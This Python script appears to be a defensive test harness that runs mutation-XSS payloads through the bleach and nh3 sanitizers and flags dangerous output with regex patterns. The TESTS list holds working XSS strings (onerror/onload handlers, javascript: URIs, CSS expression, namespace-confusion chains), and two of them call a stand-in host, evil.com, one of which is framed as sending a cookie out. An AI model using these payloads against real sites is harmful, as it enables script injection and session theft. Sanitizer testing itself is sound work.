"""Test mXSS patterns against Python sanitizers (bleach, nh3)"""
import sys

try:
    import bleach
    print(f"bleach version: {bleach.__version__}")
except ImportError:
    bleach = None
    print("bleach: NOT INSTALLED")

try:
    import nh3
    print(f"nh3 version: {nh3.__version__}")
except ImportError:
    nh3 = None
    print("nh3: NOT INSTALLED")

TESTS = [
    ("SVG style CSS expression", '<svg><style>*{x:expression(alert(1))}</style></svg>'),
    ("SVG style @import javascript", '<svg><style>@import "javascript:alert(1)"</style></svg>'),
    ("SVG style -moz-binding", '<svg><style>*{-moz-binding:url(javascript:alert(1))}</style></svg>'),
    ("SVG style url(javascript:)", '<svg><style>*{background:url(javascript:alert(1))}</style></svg>'),
    ("SVG style external @import", '<svg><style>@import "//evil.com/xss.css"</style></svg>'),
    ("Table style CSS injection", '<table><style>*{background:url(javascript:alert(1))}</style></table>'),
    ("Standalone style injection", '<style>*{background:url(javascript:alert(1))}</style>'),
    ("SVG onload", '<svg onload=alert(1)>'),
    ("img onerror", '<img src=x onerror=alert(1)>'),
    ("javascript: href", '<a href="javascript:alert(1)">click</a>'),
    ("Namespace SVG desc", '<svg><desc><body><img src=x onerror=alert(1)></body></desc></svg>'),
    ("Namespace Math mtext", '<math><mtext><body><img src=x onerror=alert(1)></body></mtext></math>'),
    ("Base javascript href", '<base href="javascript:alert(1)//"><a href="test">click</a>'),
    ("Form javascript action", '<form action="javascript:alert(1)"><button>go</button></form>'),
    ("Meta refresh javascript", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'),
    ("SVG foreignObject chain", '<svg><foreignObject><math><mtext><table><mglyph><style><!--</style><svg onload=alert(1)>--></mglyph></table></mtext></math></foreignObject></svg>'),
    ("Deep nesting + SVG", '<div>' * 50 + '<svg><desc><table><tr><td><img src=x onerror=alert(1)></td></tr></table></desc></svg>' + '</div>' * 50),
    ("SVG style data exfil", '<svg><style>*{background:url(//evil.com/steal?cookie=x)}</style></svg>'),
]

import re
PATTERNS = [
    (re.compile(r'on\w+\s*=', re.I), "event_handler"),
    (re.compile(r'javascript\s*:', re.I), "javascript_uri"),
    (re.compile(r'<script[\s>]', re.I), "script_tag"),
    (re.compile(r'expression\s*\(', re.I), "css_expression"),
    (re.compile(r'-moz-binding\s*:', re.I), "moz_binding"),
    (re.compile(r'@import\s+["\']?javascript', re.I), "css_import_js"),
    (re.compile(r'url\s*\(\s*javascript', re.I), "css_url_js"),
    (re.compile(r'@import\s+["\']?//', re.I), "css_external"),
    (re.compile(r'url\s*\(\s*//', re.I), "css_external_url"),
    (re.compile(r'behavior\s*:\s*url', re.I), "css_behavior"),
]

def check(output):
    found = []
    for pat, label in PATTERNS:
        if pat.search(output):
            found.append(label)
    return found

print("\n" + "=" * 70)
print("PYTHON SANITIZER TEST RESULTS")
print("=" * 70)

for name, inp in TESTS:
    print(f"\n--- {name} ---")

    if bleach:
        try:
            out = bleach.clean(inp)
            dangers = check(out)
            if dangers:
                print(f"  [!!] bleach: {', '.join(dangers)}")
                print(f"       {out[:120]}")
            else:
                print(f"  [OK] bleach: safe")
        except Exception as e:
            print(f"  [ER] bleach: {e}")

    if nh3:
        try:
            out = nh3.clean(inp)
            dangers = check(out)
            if dangers:
                print(f"  [!!] nh3: {', '.join(dangers)}")
                print(f"       {out[:120]}")
            else:
                print(f"  [OK] nh3: safe")
        except Exception as e:
            print(f"  [ER] nh3: {e}")

        # nh3 with permissive config (no style - nh3 prevents it)
        try:
            out = nh3.clean(inp, tags={"svg", "math", "table", "img", "a", "div", "form", "base", "meta", "foreignObject", "desc", "mtext", "tr", "td", "button", "mglyph", "body"},
                          attributes={"*": {"*"}})
            dangers = check(out)
            if dangers:
                print(f"  [!!] nh3+permissive: {', '.join(dangers)}")
                print(f"       {out[:120]}")
            else:
                print(f"  [OK] nh3+permissive: safe")
        except Exception as e:
            print(f"  [ER] nh3+permissive: {e}")
